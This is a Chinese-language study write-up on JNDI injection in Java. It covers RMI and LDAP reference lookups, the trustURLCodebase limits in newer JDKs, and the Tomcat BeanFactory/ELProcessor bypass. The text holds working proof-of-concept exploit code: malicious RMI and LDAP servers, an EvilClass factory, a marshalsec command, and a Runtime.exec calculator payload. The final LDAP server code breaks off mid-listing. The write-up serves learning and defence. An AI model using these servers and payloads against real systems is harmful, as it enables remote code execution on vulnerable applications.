# JNDI学习记录(1)

  
  
&lt;!--more--&gt;  
## 0x00 前言  
之前学的JNDI太杂了，又得重新学一遍Orz  
## 0x01 什么是JNDI？  
`JNDI(Java Naming and Dirtectory Interface)`是`Java`提供的`Java`命名和目录接口。通过调用`JNDI`的`API`可以定位资源和其他程序对象。  
`JNDI`是`Java EE`的重要部分，`JNDI`可访问的现有的目录及服务有`JDBC`、`LDAP`、`RMI`、`DNS`、`NIS`、`CORBA`。  
在`JDK`中包含了下述内置的目录服务：  
`RMI`:`Java Remote Method Invocation`，`Java`远程方法调用;  
`LDAP`:轻量级目录访问协议;  
`CORBA`:`Common Object Request Broker Architecture`，通用对象请求代理架构，用于 `COS` 名称服务(`Common Object Services`)；  
### JNDI的结构  
从上面介绍的三个`Service Provider`，可以看到，除了`RMI`是`Java`特有远程调用框架，其他两个都是通用的服务和标准，可以脱离`Java`独立使用。`JNDI`就是在这个基础上提供了统一的接口，来方便调用各种服务。  
在`Java JDK`里面提供了5个包，提供给`JNDI`的功能实现，分别是：  
```  
javax.naming:主要用于命名操作，包含了访问目录服务所需要的类和接口，比如Context、Bindings、References、lookup等。  
javax.naming.directory:主要用于目录操作，它定义了DirContext接口和InitialDir-Context类；  
javax.naming.event:在命名目录服务器请求事件通知;  
javax.naming.ldap:提供ldap支持;  
javax.naming.spi:允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。  
```  
### 类介绍  
#### InitialContext类  
```  
//构建一个初始上下文  
InitialContext()  
//构造一个初始上下文，并选择不初始化它  
InitialContext(boolean lazy)  
//使用提供的环境构建初始上下文  
InitialContext(Hashtable&lt;?,?&gt; environment)  
```  
**常用方法**  
```  
//将名称绑定到对象。  
bind(Name name,Object obj)  
//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名  
list(String name)  
//检索命名对象  
lookup(String name)  
//将名称绑定到对象，覆盖任何现有绑定。  
rebind(String name,Object obj)  
//取消绑定命名对象  
unbind(String name)  
```  
Demo  
```java  
import javax.naming.InitialContext;    
    
public class RMIClient {    
    public static void main(String[] args) throws Exception {    
        String uri = &#34;rmi://localhost/RMIClient&#34;;    
        InitialContext ic = new InitialContext();    
        ic.lookup(uri);    
    }    
}  
```  
#### Reference类  
该类也是在`javax.naming`的一个类，该类表示在命名/目录系统外部找到的对象的引用。提供了`JNDI`中类的引用功能。  
构造方法  
```  
//为类名为&#34;className&#34;的对象构造一个新的引用  
Reference(String className)  
//为类名为&#34;className&#34;的对象和地址构造一个新引用  
Reference(String className,RefAddr addr)  
//为类名为&#34;className&#34;的对象，对象工厂的类名和位置以及对象的地址构造一个新引用  
Reference(String className,RefAddr addr,String factory,String factoryLocation)  
//为类名为&#34;className&#34;的对象以及对象工厂的类名和位置构造一个新引用  
Reference(String className,String factory,String factoryLocation)  
/*  
参数：  
className 远程加载时所使用的类名  
factory  加载的class中需要实例化类的名称  
factoryLocation  提供classes数据的地址可以是file/ftp/http协议  
*/  
```  
常用方法  
```  
//将地址添加到索引posn的地址列表中。  
void add(int posn, RefAddr addr)   
//将地址添加到地址列表的末尾。   
void add(RefAddr addr)   
//从此引用中删除所有地址。    
void clear()   
//检索索引posn上的地址。   
RefAddr get(int posn)   
//检索地址类型为“addrType”的第一个地址。    
RefAddr get(String addrType)   
//检索本参考文献中地址的列举。   
Enumeration&lt;RefAddr&gt; getAll()   
//检索引用引用的对象的类名。   
String getClassName()   
//检索此引用引用的对象的工厂位置。    
String getFactoryClassLocation()   
//检索此引用引用对象的工厂的类名。    
String getFactoryClassName()   
//从地址列表中删除索引posn上的地址。      
Object remove(int posn)   
//检索此引用中的地址数。   
int size()   
//生成此引用的字符串表示形式。  
String toString()   
```  
Demo  
```java  
import com.sun.jndi.rmi.registry.ReferenceWrapper;    
    
import javax.naming.Reference;    
import java.rmi.registry.LocateRegistry;    
import java.rmi.registry.Registry;    
    
public class jndi {    
    public static void main(String[] args) throws Exception {    
        String url = &#34;http://localhost:8080&#34;;    
        Registry registry = LocateRegistry.createRegistry(1099);    
        Reference ref = new Reference(&#34;test&#34;,&#34;test&#34;,url);    
        ReferenceWrapper refWrapper = new ReferenceWrapper(ref);    
        registry.bind(&#34;aa&#34;,refWrapper);    
    }    
}  
```  
这里可以看到调用完`Reference`后又调用了`ReferenceWrapper`将前面的`Reference`对象给传进去了，这是为什么呢？  
其实查看`Reference`就可以知道，他并没有实现`Remote`接口也没有继承`UnicastRemoteObject`类，将类注册到`Registry`需要实现`Remote`和继承`UnicastRemoteObject`类。这里并没有相关的实现，所以需要调用`ReferenceWrapper`给他封装一下。  
## JNDI_RMI  
### 低版本JDK运行  
服务端代码  
```java  
import com.sun.jndi.rmi.registry.ReferenceWrapper;    
    
import javax.naming.Reference;    
import java.rmi.registry.LocateRegistry;    
import java.rmi.registry.Registry;    
    
public class RMIServer {    
    public static void main(String[] args) throws Exception {    
        Registry registry = LocateRegistry.createRegistry(1099);    
        String factoryUrl = &#34;http://localhost:1098/&#34;;    
        Reference ref = new Reference(&#34;test&#34;,&#34;test&#34;,factoryUrl);    
        ReferenceWrapper refWrapper = new ReferenceWrapper(ref);    
        registry.bind(&#34;aa&#34;,refWrapper);    
        System.out.println(&#34;Server ready&#34;);    
    }    
}  
```  
客户端代码  
```java  
package Client;    
    
import javax.naming.InitialContext;    
import javax.naming.NamingException;    
    
public class RMIClient {    
    public static void main(String[] args) throws NamingException {    
        Object ret = new InitialContext().lookup(&#34;rmi://localhost:1099/aa&#34;);    
        System.out.println(&#34;ret:&#34;&#43;ret);    
    }    
}  
```  
恶意类  
```java  
import javax.naming.Context;    
import javax.naming.Name;    
import javax.naming.spi.ObjectFactory;    
import java.util.Hashtable;    
    
public class EvilClass implements ObjectFactory{    
    static void log(String key){    
        System.out.println(&#34;EvilClass:&#34;&#43;key);    
    }    
    {    
        EvilClass.log(&#34;IIB block&#34;);    
    }    
    static{    
        EvilClass.log(&#34;static block&#34;);    
    }    
    public EvilClass(){    
        EvilClass.log(&#34;constructor&#34;);    
    }    
    
    
    @Override    
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {    
        EvilClass.log(&#34;getObjectInstance&#34;);    
        return null;    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505041219324.png)  
客户端中远程的类代码按照顺序被执行  
```  
static在类加载的时候执行  
代码块和无参构造方法在class.newInstance()时执行  
```  
### 高版本JDK运行  
在`JDK6u132`、`7u122`、`8u113`开始`com.sun.jndi.rmi.object.trustURLCodebase`默认值为`false`，运行时加入参数`-Dcom.sun.jndi.rmi.object.trustURLCodebase=true`。因为如果`JDK`高于这些版本，默认是不信任远程代码的，因此也就无法加载远程`RMI`代码。  
#### 原因分析  
在`com.sun.jndi.rmi.registry.RegistryContext#decodeObject`中  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505041323542.png)  
其中`getFactoryClassLocation()`方法是获取`classFactoryLocation`地址，可以看到，在`ref != null &amp;&amp; reg.getFactoryClassLocation() != null`的情况下，会对`trustURLCodebase`进行取反，由于在 `JDK 6u132`、`7u122`、`8u113` 版本及以后， `com.sun.jndi.rmi.object.trustURLCodebase` 默认为 `false` ，所以会进入 `if` 语句，抛出异常。  
#### 绕过方式  
要解码的对象`r`是远程引用，就需要先解引用然后再调用`NamingManager.getObjectInstance`，其中实例化对应的`ObjectFactory`类并调用其`getObjectInstance`方法，这也符合我们前面打印的`EvilClass`的执行顺序。  
需要绕过`ConfigurationException`的限制，我们有三种方法：令`ref`为空，或者令`reg.getFactoryClasssLocation()`为空，或者令`trustURLCodebase`为`true`  
方法一:令`ref`为空，从语义上看需要`obj`既不是`Reference`也不是`Referenceable`。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程`RMI`没有操作的空间。  
方法二:令`ref.getFactoryClassLocation()`返回为空，即，让`ref`对象的`classFactoryLocation`属性为空，这个属性表示引用所指向对象的对应`factory`名称，对于远程代码加载而言是`codebase`，即远程代码的`URL`地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的`factory`是本地代码，则该值为空，这是绕过高版本`JDK`限制的关键。  
方法三:在命令行指定 `com.sun.jndi.rmi.object.trustURLCodebase=true`  
来看一下`getFactoryClassLocation()`方法，以及返回值的赋值情况。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505041333933.png)  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505041333205.png)  
要满足方法二的情况，需要在远程`RMI`服务起返回的`Reference`对象中不指定`Factory`的`codebase`。接着需要看`javax.naming.spi.NamingManager`的解析过程。  
```java  
public static Object    
    getObjectInstance(Object refInfo, Name name, Context nameCtx,    
                      Hashtable&lt;?,?&gt; environment)    
    throws Exception    
{    
    
    ObjectFactory factory;    
    
    // Use builder if installed    
    ObjectFactoryBuilder builder = getObjectFactoryBuilder();    
    if (builder != null) {    
        // builder must return non-null factory    
        factory = builder.createObjectFactory(refInfo, environment);    
        return factory.getObjectInstance(refInfo, name, nameCtx,    
            environment);    
    }    
    
    // Use reference if possible    
    Reference ref = null;    
    if (refInfo instanceof Reference) {    
        ref = (Reference) refInfo;    
    } else if (refInfo instanceof Referenceable) {    
        ref = ((Referenceable)(refInfo)).getReference();    
    }    
    
    Object answer;    
    
    if (ref != null) {    
        String f = ref.getFactoryClassName();    
        if (f != null) {    
            // if reference identifies a factory, use exclusively    
    
            factory = getObjectFactoryFromReference(ref, f);    
            if (factory != null) {    
                return factory.getObjectInstance(ref, name, nameCtx,    
                                                 environment);    
            }    
            // No factory found, so return original refInfo.    
            // Will reach this point if factory class is not in            // class path and reference does not contain a URL for it            return refInfo;    
    
        } else {    
            // if reference has no factory, check for addresses    
            // containing URLs    
            answer = processURLAddrs(ref, name, nameCtx, environment);    
            if (answer != null) {    
                return answer;    
            }    
        }    
    }    
    
    // try using any specified factories    
    answer =    
        createObjectFromFactories(refInfo, name, nameCtx, environment);    
    return (answer != null) ? answer : refInfo;    
}  
```  
在处理`Reference`对象时，会先调用`ref.getFactoryClassName()`获取对应的工厂类的名称，也就是会先从本地的`CLASSPATH`中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。  
之后会执行静态代码块、代码块、无参构造函数和`getObjectInstance`方法。那么只需要在攻击者本地`CLASSPATH`找到`Reference Factory`类并且在这四个地方其中一块能执行`payload`就可以了。但`getObjectInstance`方法需要你的类实现`javax.naming.spi.ObjectFactory`接口。因此，我们实际上可以指定一个存在于目标`classpath`中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制。  
```  
InitialContext#lookup()  
  RegistryContext#lookup()  
    RegistryContext#decodeObject()  
      NamingManager#getObjectInstance()  
          objectfactory = NamingManager#getObjectFactoryFromReference()  
                  Class#newInstance()  //--&gt;恶意代码被执行  
     或:   objectfactory#getObjectInstance()  //--&gt;恶意代码被执行  
```  
满足要求的工厂类条件：存在于本地的`CLASSPATH`中，实现了`javax.naming.spi.ObjectFactory`接口至少存在一个`getObjectInstance()`方法。  
在`Tomcat`依赖包中的`org.apache.naming.factory.BeanFactory`正符合这样的条件，这个类在`Tomcat`中，很多web应用都会包含  
关键代码如下  
```java  
public Object getObjectInstance(Object obj, Name name, Context nameCtx,  
                                Hashtable&lt;?,?&gt; environment)  
    throws NamingException {  
  
    Reference ref = (Reference) obj;  
    String beanClassName = ref.getClassName();  
    ClassLoader tcl = Thread.currentThread().getContextClassLoader();  
    // 1. 反射获取类对象  
    if (tcl != null) {  
        beanClass = tcl.loadClass(beanClassName);  
    } else {  
        beanClass = Class.forName(beanClassName);  
    }  
    // 2. 初始化类实例  
    Object bean = beanClass.getConstructor().newInstance();  
  
    // 3. 根据 Reference 的属性查找 setter 方法的别名  
    RefAddr ra = ref.get(&#34;forceString&#34;);  
    String value = (String)ra.getContent();  
  
    // 4. 循环解析别名并保存到字典中  
    for (String param: value.split(&#34;,&#34;)) {  
        param = param.trim();  
        index = param.indexOf(&#39;=&#39;);  
        if (index &gt;= 0) {  
            setterName = param.substring(index &#43; 1).trim();  
            param = param.substring(0, index).trim();  
        } else {  
            setterName = &#34;set&#34; &#43;  
                param.substring(0, 1).toUpperCase(Locale.ENGLISH) &#43;  
                param.substring(1);  
        }  
        forced.put(param, beanClass.getMethod(setterName, paramTypes));  
    }  
  
    // 5. 解析所有属性，并根据别名去调用 setter 方法  
    Enumeration&lt;RefAddr&gt; e = ref.getAll();  
    while (e.hasMoreElements()) {  
        ra = e.nextElement();  
        String propName = ra.getType();  
        String value = (String)ra.getContent();  
        Object[] valueArray = new Object[1];  
        Method method = forced.get(propName);  
        if (method != null) {  
            valueArray[0] = value;  
            method.invoke(bean, valueArray);  
        }  
  
    }  
}  
```  
上面注释了关键的部分代码，可以通过在返回客户端的`Reference`对象的`forceString`字段指定`setter`方法的别名，并且后续初始化过程中进行调用。  
`forceString`的格式为`a=foo,bar`，以逗号分隔每个需要设置的属性，如果包含等号，则对应的 `setter` 方法为等号后的值 `foo`，如果不包含等号，则 `setter` 方法为默认值 `setBar`。  
在后续调用时，调用`setter`方法使用单个参数，且参数值为对应的属性对象`RefAddr`的值`getContent`。因此，实际上我们可以调用任意指定类的任意方法，并指定单个可控的参数。  
使用`newInstance`创建实例，所以只能调用无参构造，这就要求目标`class`得有无参构造方法，上面`forceString`可以给属性强制指定一个`setter`方法，参数为一个`String`类型，可以利用`javax.el.ELProcessor`作为目标`class`，利用`el`表达式执行命令。  
所以绕过流程就是，  
需要满足`ref.getFactoryClassLocation()` 为空，只需要在远程 `RMI` 服务器返回的 `Reference` 对象中不指定 `Factory` 的 `codebase`  
来到`NamingManager`，需要在攻击者本地`CLASSPATH`找到这个`Reference Factory`类并且在其中一块代码能执行`payload`，找到了`BeanFactory`  
`BeanFactory`使用`newInstance`创建实例，所以只能调用无参构造，这就要求目标 `class` 得有无参构造方法且有办法执行相关命令，于是找到`ELProcessor`和`GroovyShell`  
总结起来就是绕过了`ConfigurationException`，进入`NamingManager`，使用`BeanFactor`创建`ELProcessor`/`GroovyShell`无参实例，然后`BeanFactor`根据别名去调用方法（执行`ELProcessor`中的`eval`方法）  
Poc  
```java  
package Server;    
    
    
import com.sun.jndi.rmi.registry.ReferenceWrapper;    
import org.apache.naming.ResourceRef;    
    
import javax.naming.StringRefAddr;    
import java.rmi.registry.LocateRegistry;    
import java.rmi.registry.Registry;    
    
public class RMIServerBypass {    
    public static void main(String[] args) throws Exception {    
        Registry registry = LocateRegistry.createRegistry(1099);    
        ResourceRef ref = new ResourceRef(&#34;javax.el.ELProcessor&#34;, null, &#34;&#34;, &#34;&#34;, true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);    
        ref.add(new StringRefAddr(&#34;forceString&#34;,&#34;evil=eval&#34;));    
        ref.add(new StringRefAddr(&#34;evil&#34;,&#34;Runtime.getRuntime().exec(\&#34;open -a Calculator.app\&#34;)&#34;));    
        ReferenceWrapper refWrapper = new ReferenceWrapper(ref);    
        registry.bind(&#34;calc&#34;,refWrapper);    
        System.out.println(&#34;Server ready&#34;);    
    }    
}   
```  
`org.apache.naming.ResourceRef` 在 `tomcat` 中表示某个资源的引用，其构造函数参数如下:  
```java  
/**  
    * Resource Reference.  
    *  
    * @param resourceClass Resource class  
    * @param description Description of the resource  
    * @param scope Resource scope  
    * @param auth Resource authentication  
    * @param singleton Is this resource a singleton (every lookup should return  
    *                  the same instance rather than a new instance)?  
    * @param factory The possibly null class name of the object&#39;s factory.  
    * @param factoryLocation The possibly null location from which to load the  
    *                        factory (e.g. URL)  
    */  
public ResourceRef(String resourceClass, String description,  
                    String scope, String auth, boolean singleton,  
                    String factory, String factoryLocation) {  
                        //...  
                    }  
```  
这里利用到了`javax.el.ELProcessor`，所以需要`Tomcat 8&#43;`或`SpringBoot1.2.x&#43;`  
## JNDI_LDAP  
`LDAP`服务作为一个树形数据库，可以通过一些特殊的属性来实现`Java`对象的存储，此外，还有一些其他实现`Java`对象存储的方法:使用`Java`序列化进行存储；使用`JNDI`的引用(Reference)进行存储  
使用这些方法存储在`LDAP`目录中的`Java`对象一旦被客户端解析(反序列化)，就可能会引起远程代码执行。  
### 低版本JDK运行  
可以通过`LDAP`服务来绕过`URLCodebase`实现远程加载，`LDAP`服务也能返回`JNDI Reference`对象，利用过程与`jndi`&#43;`RMI Reference`基本一致，不同的是，`LDAP`服务中`lookup`方法中指定的远程地址使用的是`LDAP`协议，由攻击者控制`LDAP`服务端返回一个恶意`JNDI Reference`对象，并且`LDAP`服务的`Reference`远程加载`Factory`类并不是使用`RMI Class Loader`机制，因此不受`trustURLCodebase`限制。  
利用之前，需要下载`LDAP`服务  
```xml  
&lt;dependency&gt;  
    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;  
    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;  
    &lt;version&gt;3.1.1&lt;/version&gt;  
&lt;/dependency&gt;  
```  
**工具**  
使用`marshalsec`开启`LDAP`服务  
```  
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/\#EvilClass  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505041658706.png)  
**流程分析**  
`JNDI`发起`ldap`的`lookup`后，我们重点关注，获得`LDAP Server`的`Entry`之后，`Client`这边是怎么做处理的。  
`LADP`服务利用流程分析，`LADP`服务前面的调用流程和`jndi`是基本一样，从`Obj`类的`decodeObject`方法这里就有些不太一样了，`decodeObject`方法内部调用了`decodeReference`方法  
跟进`com.sun.jndi.ldap.Obj.java#decodeObject`，按照该函数的注释来看，其主要功能是解码从`LDAP Server`来的对象，该对象可能是序列化的对象，也可能是一个`Reference`对象。关于序列化对象的处理。这里看`Reference`的处理方式  
```java  
static Object decodeObject(Attributes var0) throws NamingException {  
    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));  
  
    try {  
        Attribute var1;  
        if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {  
            ClassLoader var3 = helper.getURLClassLoader(var2);  
            return deserializeObject((byte[])((byte[])var1.get()), var3);  
        } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {  
            return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);  
        } else {  
            var1 = var0.get(JAVA_ATTRIBUTES[0]);  
//调用了decodeReference方法  
            return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);  
        }  
    } catch (IOException var5) {  
        NamingException var4 = new NamingException();  
        var4.setRootCause(var5);  
        throw var4;  
    }  
}  
```  
`Obj`类的`decodeReference`方法根据`Ldap`传入的`addAttribute`属性构造并返回了一个新的`reference`对象引用  
```java  
private static Reference decodeReference(Attributes var0, String[] var1) throws NamingException, IOException {  
        String var4 = null;  
        Attribute var2;  
        if ((var2 = var0.get(JAVA_ATTRIBUTES[2])) == null) {  
            throw new InvalidAttributesException(JAVA_ATTRIBUTES[2] &#43; &#34; attribute is required&#34;);  
        } else {  
            String var3 = (String)var2.get();  
            if ((var2 = var0.get(JAVA_ATTRIBUTES[3])) != null) {  
                var4 = (String)var2.get();  
            }  
            //返回一个新的Reference对象引用  
            Reference var5 = new Reference(var3, var4, var1 != null ? var1[0] : null);  
            //获取第6个属性  
            if ((var2 = var0.get(JAVA_ATTRIBUTES[5])) != null) {  
               //省略部分代码  
            }  
            //直接返回reference对象  
            return var5;  
        }  
}  
```  
`LDAP`服务的`Reference`对象引用的获取和`jndi`注入中的不太一样，`jndi`是通过`ReferenceWrapper_Stub`对象的`getReference`方法获取`reference`对象，而`LDAP`服务是根据传入的属性构造一个新的`reference`对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为`null`则直接返回新的`reference`对象引用。  
接着会返回到`decodeObject`方法调用处，然后再返回到`LdapCtx`类的`c_lookup`方法调用处，接着往下执行调用`getObjectInstance`方法  
```java  
protected Object c_lookup(Name var1, Continuation var2) throws NamingException {  
    var2.setError(this, var1);  
    Object var3 = null;  
  
    Object var4;  
    try {  
        SearchControls var22 = new SearchControls();  
        var22.setSearchScope(0);  
        var22.setReturningAttributes((String[])null);  
        var22.setReturningObjFlag(true);  
        LdapResult var23 = this.doSearchOnce(var1, &#34;(objectClass=*)&#34;, var22, true);  
        this.respCtls = var23.resControls;  
        if (var23.status != 0) {  
            this.processReturnCode(var23, var1);  
        }  
  
        if (var23.entries != null &amp;&amp; var23.entries.size() == 1) {  
            LdapEntry var25 = (LdapEntry)var23.entries.elementAt(0);  
            var4 = var25.attributes;  
            Vector var8 = var25.respCtls;  
            if (var8 != null) {  
                appendVector(this.respCtls, var8);  
            }  
        } else {  
            var4 = new BasicAttributes(true);  
        }  
  
        if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {  
//var3接收reference对象  
            var3 = Obj.decodeObject((Attributes)var4);  
        }  
  
        if (var3 == null) {  
            var3 = new LdapCtx(this, this.fullyQualifiedName(var1));  
        }  
    } catch (LdapReferralException var20) {  
        LdapReferralException var5 = var20;  
        if (this.handleReferrals == 2) {  
            throw var2.fillInException(var20);  
        }  
  
        while(true) {  
            LdapReferralContext var6 = (LdapReferralContext)var5.getReferralContext(this.envprops, this.bindCtls);  
  
            try {  
                Object var7 = var6.lookup(var1);  
                return var7;  
            } catch (LdapReferralException var18) {  
                var5 = var18;  
            } finally {  
                var6.close();  
            }  
        }  
    } catch (NamingException var21) {  
        throw var2.fillInException(var21);  
    }  
  
    try {  
//调用了getObjectInstance方法  
        return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);  
    } catch (NamingException var16) {  
        throw var2.fillInException(var16);  
    } catch (Exception var17) {  
        NamingException var24 = new NamingException(&#34;problem generating object using object factory&#34;);  
        var24.setRootCause(var17);  
        throw var2.fillInException(var24);  
    }  
}  
```  
`c_lookup`方法将`var3`(`reference`对象)传给了`getObjectInstance`方法的`refInfo`参数，继续跟进`getObjectInstance`方法。  
```java  
public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx , Hashtable&lt;?,?&gt; environment, Attributes attrs) throws Exception {  
            ObjectFactory factory;  
            //获取对象工厂  
            ObjectFactoryBuilder builder = getObjectFactoryBuilder();  
            if (builder != null) {  
                // builder must return non-null factory  
                factory = builder.createObjectFactory(refInfo, environment);  
                if (factory instanceof DirObjectFactory) {  
                    return ((DirObjectFactory)factory).getObjectInstance(  
                        refInfo, name, nameCtx, environment, attrs);  
                } else {  
                    return factory.getObjectInstance(refInfo, name, nameCtx,  
                        environment);  
                }  
            }  
  
            // use reference if possible  
            Reference ref = null;  
            //判断reference对象是否为Reference  
            if (refInfo instanceof Reference) {  
                 //转换为Reference类型  
                ref = (Reference) refInfo;  
            } else if (refInfo instanceof Referenceable) {  
                ref = ((Referenceable)(refInfo)).getReference();  
            }  
  
            Object answer;  
            //reference对象是否为空  
            if (ref != null) {  
                //获取工厂类名Exp  
                String f = ref.getFactoryClassName();  
                if (f != null) {  
                    // if reference identifies a factory, use exclusively  
                    //根据工厂类远程获取对象引用  
                    factory = getObjectFactoryFromReference(ref, f);  
                    if (factory instanceof DirObjectFactory) {  
                        return ((DirObjectFactory)factory).getObjectInstance(  
                            ref, name, nameCtx, environment, attrs);  
                    } else if (factory != null) {  
                        return factory.getObjectInstance(ref, name, nameCtx,  
                                                         environment);  
                    }  
                    // No factory found, so return original refInfo.  
                    // Will reach this point if factory class is not in  
                    // class path and reference does not contain a URL for it  
                    return refInfo;  
  
                } else {  
                    // if reference has no factory, check for addresses  
                    // containing URLs  
                    // ignore name &amp; attrs params; not used in URL factory  
  
                    answer = processURLAddrs(ref, name, nameCtx, environment);  
                    if (answer != null) {  
                        return answer;  
                    }  
                }  
            }  
  
            // try using any specified factories  
            answer = createObjectFromFactories(refInfo, name, nameCtx,  
                                               environment, attrs);  
            return (answer != null) ? answer : refInfo;  
  
    }  
```  
`getObjectFactortyFromReference`方法实现如下  
```java  
 static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) throws IllegalAccessException,InstantiationException, MalformedURLException {  
        Class&lt;?&gt; clas = null;  
  
        // Try to use current class loader  
        try {  
             //尝试先在本地加载Exp类  
             clas = helper.loadClass(factoryName);  
        } catch (ClassNotFoundException e) {  
            // ignore and continue  
            // e.printStackTrace();  
        }  
        // All other exceptions are passed up.  
  
        // Not in class path; try to use codebase  
        String codebase;  
        //获取远程地址  
        if (clas == null &amp;&amp; (codebase = ref.getFactoryClassLocation()) != null) {  
            try {  
                //loadClass方法远程加载Exp类  
                clas = helper.loadClass(factoryName, codebase);  
            } catch (ClassNotFoundException e) {  
  
            }  
        }  
  
        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;  
    }  
```  
可以看到`LDAP`服务跟`jndi`一样，会尝试先在本地查找加载`Exp`类，如果本地没有找到`Exp`类，那么`getFactoryClassLocation`方法会获取远程加载的`url`地址，如果不为空则根据远程`url`地址使用类加载器`URLClassLoader`来加载`Exp`类，通过分析发现`LDAP`服务的整个利用流程都没有`URLCodebase`限制。  
完整调用栈如下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505041717964.png)  
### 高版本运行  
**限制**  
在`jdk8u191`以上的版本中修复了LDAP服务远程加载恶意类这个漏洞，`LDAP`服务在进行远程加载之前也添加了系统属性`trustURLCodebase`的限制，通过分析在`jdk8u191`版本，在`loadClass`方法内部添加了系统属性`trustURLCodebase`的判断，如果`trustURLCodebase`为`false`就直接返回`null`，只有当`trustURLCodebase`值为`true`是才允许远程加载。  
在高版本 `JDK` 中需要通过 `com.sun.jndi.ldap.object.trustURLCodebase` 选项去启用。这个限制在 `JDK 11.0.1`、`8u191`、`7u201`、`6u211` 版本时加入，略晚于 `RMI` 的远程加载限制。  
**使用序列化数据触发Gadget**  
触发点`com.sun.jndi.ldap.Obj.java#decodeObject`存在对`JAVA_ATTRIBUTES[SERIALIZED_DATA]`的判断    
这里提到 `com.sun.jndi.ldap.Obj.java#decodeObject` 主要功能是解码从`LDAP Server`来的对象，该对象可能是序列化的对象，也可能是一个`Reference`对象。之前讲到`Reference`对象，现在讲一下传来的是序列化的对象这种情况。    
如果是序列化对象会调用`deserializeObject`方法  
Poc  
```java  
import com.alter.JNDI_LDAP.util.serializeObject;  
import com.unboundid.ldap.listener.InMemoryDirectoryServer;  
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  
import com.unboundid.ldap.listener.InMemoryListenerConfig;  
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  
import com.unboundid.ldap.sdk.Entry;  
import com.unboundid.ldap.sdk.LDAPException;  
import com.unboundid.ldap.sdk.LDAPResult;  
import com.unboundid.ldap.sdk.ResultCode;  
  
import javax.net.ServerSocketFactory;  
import javax.net.SocketFactory;  
import javax.net.ssl.SSLSocketFactory;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectOutputStream;  
import java.net.InetAddress;  
import java.net.MalformedURLException;  
import java.net.URL;  
  
  
import static com.alter.JNDI_LDAP.util.serializeObject.getPayload;  
import static com.alter.JNDI_LDAP.util.serializeObject.serializeObject;  
  
public class Ldap {  
    private static final String LDAP_BASE = &#34;dc=example,dc=com&#34;;  
  
    public static void main(String[] argsx) {  
        String[] args = new String[]{&#34;http://127.0.0.1:8000/#EvilClass&#34;, &#34;1389&#34;};  
        int port = 0;  
        if (args.length &lt; 1 || args[0].indexOf(&#39;#&#39;) &lt; 0) {  
            System.err.println(Ldap.class.getSimpleName() &#43; &#34; &lt;codebase_url#classname&gt; [&lt;port&gt;]&#34;); //$NON-NLS-1$  
            System.exit(-1);  
        } else if (args.length &gt; 1) {  
            port = Integer.parseInt(args[1]);  
        }  
  
        try {  
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  
            config.setListenerConfigs(new InMemoryListenerConfig(  
                    &#34;listen&#34;, //$NON-NLS-1$  
                    InetAddress.getByName(&#34;0.0.0.0&#34;), //$NON-NLS-1$  
                    port,  
                    ServerSocketFactory.getDefault(),  
                    SocketFactory.getDefault(),  
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));  
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));  
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  
            System.out.println(&#34;Listening on 0.0.0.0:&#34; &#43; port); //$NON-NLS-1$  
            ds.startListening();  
  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
  
    private static class OperationInterceptor extends InMemoryOperationInterceptor {  
  
        private URL codebase;  
  
        /**  
         *  
         */  
        public OperationInterceptor(URL cb) {  
            this.codebase = cb;  
        }  
  
        /**  
         * {@inheritDoc}  
         *  
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  
         */  
        @Override  
        public void processSearchResult(InMemoryInterceptedSearchResult result) {  
            String base = result.getRequest().getBaseDN();  
            Entry e = new Entry(base);  
            try {  
                sendResult(result, base, e);  
            } catch (Exception e1) {  
                e1.printStackTrace();  
            }  
  
        }  
  
        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {  
  
            //jdk8u191之后  
            e.addAttribute(&#34;javaClassName&#34;, &#34;foo&#34;);  
            //getObject获取Gadget  
  
